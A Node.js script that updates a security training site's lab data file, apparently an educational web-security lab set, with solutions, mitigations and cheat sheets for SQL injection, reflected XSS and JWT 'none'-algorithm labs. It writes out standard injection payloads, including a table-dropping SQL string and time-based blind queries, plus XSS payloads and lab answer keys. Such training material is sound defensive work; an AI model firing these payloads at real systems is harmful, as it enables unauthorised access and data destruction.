const fs = require('fs');
const d = JSON.parse(fs.readFileSync('site/data/labs.json', 'utf8'));

// Update sqli-1 with new schema
d.labs['sqli-1'] = {
  ...d.labs['sqli-1'],
  tags: ['sqli', 'union', 'auth-bypass', 'filter'],
  prerequisites: [],
  estimatedTimeMinutes: 10,
  author: 'security-team',
  version: '1.1.0',
  solution: {
    payload: "category=Gifts' OR 1=1 --",
    explanation: "The category parameter is directly concatenated into the SQL query without sanitization. The payload closes the string literal and adds an always-true condition, returning all rows.",
    mitigation: {
      js: "db.prepare('SELECT * FROM products WHERE category = ?').all(category)",
      python: "cursor.execute('SELECT * FROM products WHERE category = %s', (category,))"
    }
  },
  cheatsheet: {
    payloads: ["' OR 1=1--", "' UNION SELECT null,sqlite_version()--", "'; DROP TABLE products--"],
    tools: ['sqlmap', 'Nosqlmap'],
    references: ['https://owasp.org/www-community/attacks/SQL_Injection']
  },
  verification: { type: 'console-log', match: 'LAB_SOLVED:sqli-1' },
  related: ['sqli-2', 'sqli-3', 'auth-1']
};

// sqli-2
d.labs['sqli-2'] = {
  ...d.labs['sqli-2'],
  tags: ['sqli', 'blind', 'time-based'],
  prerequisites: ['sqli-1'],
  estimatedTimeMinutes: 15,
  author: 'security-team',
  version: '1.0.0',
  solution: { payload: "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", explanation: 'Time-based blind SQLi using conditional delays.', mitigation: {} },
  cheatsheet: { payloads: ["' AND SLEEP(5)--", "' OR IF(1=1,SLEEP(5),0)--"] },
  verification: { type: 'console-log', match: 'LAB_SOLVED:sqli-2' },
  related: ['sqli-3', 'sqli-4']
};

// xss-1
d.labs['xss-1'] = {
  ...d.labs['xss-1'],
  tags: ['xss', 'reflected', 'search'],
  prerequisites: [],
  estimatedTimeMinutes: 8,
  author: 'security-team',
  version: '1.0.0',
  solution: { payload: '<script>alert(1)</script>', explanation: 'Search query reflected unsanitized in response.', mitigation: { js: 'escapeHtml(userInput)', python: 'markupsafe.escape(user_input)' } },
  cheatsheet: { payloads: ['<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', 'javascript:alert(1)//'] },
  verification: { type: 'console-log', match: 'LAB_SOLVED:xss-1' },
  related: ['xss-2', 'xss-3']
};

// auth-1
d.labs['auth-1'] = {
  ...d.labs['auth-1'],
  tags: ['auth', 'jwt', 'alg-none'],
  prerequisites: [],
  estimatedTimeMinutes: 12,
  author: 'security-team',
  version: '1.0.0',
  solution: { payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...', explanation: 'JWT accepts "none" algorithm, allowing signature bypass.', mitigation: { js: 'verify(token, secret, { algorithms: ["HS256"] })' } },
  cheatsheet: { payloads: ['alg=none', 'key confusion', 'kid injection'] },
  verification: { type: 'console-log', match: 'LAB_SOLVED:auth-1' },
  related: ['auth-2', 'auth-3']
};

fs.writeFileSync('site/data/labs.json', JSON.stringify(d, null, 2));
console.log('Updated labs.json');